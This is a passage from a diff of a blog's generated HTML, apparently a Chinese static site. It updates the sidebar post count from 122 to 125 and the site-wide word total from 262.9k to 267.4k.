-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1411,7 +1279,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">122</span>
+          <span class="site-state-item-count">125</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1472,7 +1340,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共262.9k字</span>
+  <span class="post-count">博客全站共267.4k字</span>
 </div>
         
 
